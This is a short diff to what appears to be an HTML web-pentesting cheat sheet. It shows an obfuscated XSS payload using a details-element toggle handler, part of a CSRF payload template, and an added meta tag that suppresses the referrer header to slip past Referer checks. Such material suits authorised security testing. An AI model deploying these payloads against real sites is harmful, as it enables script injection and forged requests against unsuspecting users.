@@ -520,6 +520,7 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 		    <pre><code>&lt;details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//</code></pre>
 	    <li> Description of XSS payloads <a href='https://netsec.expert/posts/xss-in-2020/'>here</a>
 <h3 id='n2.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CSRF </h3>
+	<li> Temple for payload:
 	<pre><code>		
 &lt;html&gt;
     &lt;body&gt;
@@ -531,6 +532,8 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
     &lt;/body&gt;
 &lt;/html&gt;
 	</code></pre>
+    	<li> To avoid sending the referrer header:
+<pre><code>&lt;meta name="referrer" content="never"></code></pre>
 
 <h3 id='n2.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Chains </h3>
 	<li>Redirect bypasses for Open Redirect & SSRF!
